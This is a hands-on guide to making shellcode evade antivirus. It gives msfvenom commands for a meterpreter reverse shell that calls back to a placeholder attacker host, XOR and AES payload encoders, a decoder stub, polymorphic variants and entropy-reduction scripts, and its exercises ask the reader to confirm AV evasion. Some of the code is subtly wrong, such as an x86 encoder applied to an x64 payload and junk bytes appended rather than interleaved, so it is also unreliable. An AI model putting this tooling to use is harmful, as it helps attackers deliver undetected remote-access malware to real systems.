# Shellcode Encoding and Encryption Techniques Guide

## Introduction

Shellcode encoding and encryption are fundamental techniques for bypassing signature-based antivirus and intrusion detection systems. Raw shellcode contains distinctive byte patterns that are easily flagged by security products. Encoding transforms these patterns while preserving functionality, and encryption provides stronger protection through key-based obfuscation. This guide covers practical encoding frameworks, custom encoders, encryption techniques, and decoder stub construction used in modern evasion workflows.

Understanding encoding depth is critical for engagement success. Single-layer encoding may bypass basic signature detection but fails against heuristic analysis. Multi-layer encoding with entropy reduction techniques can evade more sophisticated detection, while encrypted payloads with custom decryption routines provide the strongest evasion against both static and dynamic analysis.

## Practical Steps

### 1. MSFvenom Encoding Pipeline

```bash
# Generate encoded shellcode with multiple iterations
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker IP LPORT=4443 \
  -e x86/shikata_ga_nai -i 5 -f raw -o encoded_stage1.bin

# Verify encoding iterations changed the payload signature
md5sum encoded_stage1.bin
shasum encoded_stage1.bin

# Encode with different encoder for second layer
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4443 \
  -e x64/xor_dynamic -i 3 -f raw -o encoded_stage2.bin

# Generate with specific bad character avoidance
msfvenom -p windows/x64/exec CMD="calc.exe" \
  -b '\x00\x0a\x0d\x25\x26\x2b\x3d' \
  -e x86/shikata_ga_nai -i 3 -f c
```

### 2. Custom XOR Encoder

```python
# Custom XOR encoder with variable key length
def xor_encode(shellcode_bytes, key):
    """XOR encode shellcode with a multi-byte key."""
    key_len = len(key)
    encoded = bytearray()
    for i, byte in enumerate(shellcode_bytes):
        encoded.append(byte ^ key[i % key_len])
    return bytes(encoded)

# Example usage
shellcode = b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
key = b"\xDE\xAD\xBE\xEF"

encoded = xor_encode(shellcode, key)
print(f"Original: {shellcode.hex()}")
print(f"Encoded:  {encoded.hex()}")

# Verify decoding works
decoded = xor_encode(encoded, key)
assert decoded == shellcode, "Decode verification failed"
print("Decode verification: PASS")
```

### 3. AES Encrypted Payload Generator

```python
# Generate AES-encrypted shellcode with random IV
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

def encrypt_shellcode(shellcode_path, output_path):
    """Encrypt shellcode with AES-256-CBC."""
    key = os.urandom(32)  # 256-bit key
    iv = os.urandom(16)   # 128-bit IV

    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(shellcode, AES.block_size))

    # Prepend IV to encrypted data
    with open(output_path, 'wb') as f:
        f.write(iv + encrypted)

    # Save key for decoder stub
    with open(output_path + '.key', 'w') as f:
        f.write(key.hex())
    print(f"Encrypted {len(shellcode)} bytes -> {len(encrypted)} bytes")
    print(f"Key: {key.hex()}")

encrypt_shellcode('payload.bin', 'payload_encrypted.bin')
```

### 4. Decoder Stub Construction

```bash
# NASM decoder stub for XOR-encoded shellcode
cat > decoder_stub.asm << 'EOF'
section .text
global _start

_start:
    jmp get_address

decoder:
    pop rsi             ; RSI = address of encoded shellcode
    mov rcx, LENGTH     ; shellcode length
    mov rbx, KEY        ; XOR key

decode_loop:
    xor byte [rsi], bl  ; decode byte
    inc rsi             ; next byte
    rol rbx, 8          ; rotate key
    loop decode_loop    ; continue

    jmp shellcode_start

get_address:
    call decoder
    shellcode_start:    ; decoded shellcode continues here
EOF

# Compile decoder stub
nasm -f elf64 decoder_stub.asm -o decoder_stub.o
ld decoder_stub.o -o decoder_stub
```

### 5. Polymorphic Code Generation

```python
# Generate polymorphic shellcode variants
import random

def generate_polymorphic(shellcode, num_variants=5):
    """Create multiple functionally-equivalent shellcode variants."""
    variants = []

    for _ in range(num_variants):
        variant = bytearray()
        # Insert NOP-equivalent sled (randomized)
        nop_sled_size = random.randint(5, 20)
        nop_equivalents = [
            b'\x90',          # NOP
            b'\x87\xC0',      # XCHG EAX, EAX
            b'\x86\xC0',      # XCHG AL, AL
            b'\x89\xC0',      # MOV EAX, EAX
            b'\x40\x48',      # INC EAX; DEC EAX
        ]
        for _ in range(nop_sled_size):
            variant += random.choice(nop_equivalents)

        # Add original shellcode
        variant += shellcode

        # Add junk code between instructions (register preservation)
        junk = [
            b'\x50\x58',      # PUSH EAX; POP EAX
            b'\x51\x59',      # PUSH ECX; POP ECX
            b'\x52\x5A',      # PUSH EDX; POP EDX
        ]
        variant += random.choice(junk)
        variants.append(bytes(variant))

    return variants
```

### 6. Entropy Analysis and Reduction

```bash
# Calculate Shannon entropy of payload
python3 -c "
import math
from collections import Counter

def shannon_entropy(data):
    if not data:
        return 0
    freq = Counter(data)
    length = len(data)
    entropy = -sum((c/length) * math.log2(c/length) for c in freq.values())
    return entropy

with open('payload.bin', 'rb') as f:
    data = f.read()
entropy = shannon_entropy(data)
print(f'Entropy: {entropy:.4f} bits/byte')
print(f'Max possible: 8.0000 bits/byte')
if entropy > 7.0:
    print('HIGH entropy - likely flagged by AV heuristic')
elif entropy > 6.0:
    print('MODERATE entropy - may trigger some heuristics')
else:
    print('LOW entropy - less likely to trigger entropy-based detection')
"

# Reduce entropy by embedding low-entropy data
python3 -c "
import random
with open('payload.bin', 'rb') as f:
    payload = bytearray(f.read())

# Pad with low-entropy ASCII text to reduce overall entropy
padding_size = len(payload) // 2
padding = bytearray(random.choices(range(0x20, 0x7F), k=padding_size))

# Interleave payload with padding
result = bytearray()
for i in range(0, len(payload)):
    result.append(payload[i])
    if i < len(padding):
        result.append(padding[i])

with open('payload_padded.bin', 'wb') as f:
    f.write(result)
print(f'Original: {len(payload)} bytes')
print(f'Padded:   {len(result)} bytes')
"
```

## Hands-on Exercises

### Exercise 1: Multi-Layer Encoding Pipeline

Create a shellcode encoding pipeline that applies three different encoding techniques sequentially. Generate a meterpreter payload, encode it with shikata_ga_nai, then apply custom XOR encoding, then encrypt with AES. Verify the final payload evades common AV signatures.

### Exercise 2: Custom Decoder Stub

Write a decoder stub in x86_64 assembly that decrypts AES-encrypted shellcode at runtime. The stub should generate the AES key from a hardcoded passphrase using SHA-256 key derivation, decrypt the payload in memory, and transfer execution to the decoded shellcode.

## References

- Metasploit Encoder Documentation — https://docs.metasploit.com/docs/using-metasploit/advanced/encoders.html
- Shellcode Encoding Techniques — https://www.exploit-db.com/docs/
- AES Encryption Standard (FIPS 197) — https://csrc.nist.gov/publications/detail/fips/197/final
- Polymorphic Code Theory — Virus Bulletin Research
